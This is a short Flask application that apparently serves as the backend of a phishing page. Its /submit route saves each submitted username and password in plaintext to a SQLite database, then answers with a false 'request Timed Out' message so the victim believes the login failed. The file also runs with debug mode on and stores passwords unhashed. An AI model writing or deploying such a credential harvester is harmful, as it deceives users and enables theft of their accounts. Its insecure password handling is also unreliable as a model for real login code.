"""

this stores the userName and password in server

"""

from io import BytesIO
from flask import Flask, render_template, request,send_file
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__, template_folder="templates")
 
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

    def __repr__(self):
        return f'<User {self.username}>'

with app.app_context():
    db.create_all()

@app.get("/")
def home():
    return render_template('index.html')

@app.post("/submit") 
def submit():
    # if request.method == 'POST':
    username = request.form['username']
    password = request.form['password']

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()
    
    return "request Timed Out"


if __name__ == '__main__':
    app.run(debug=True)
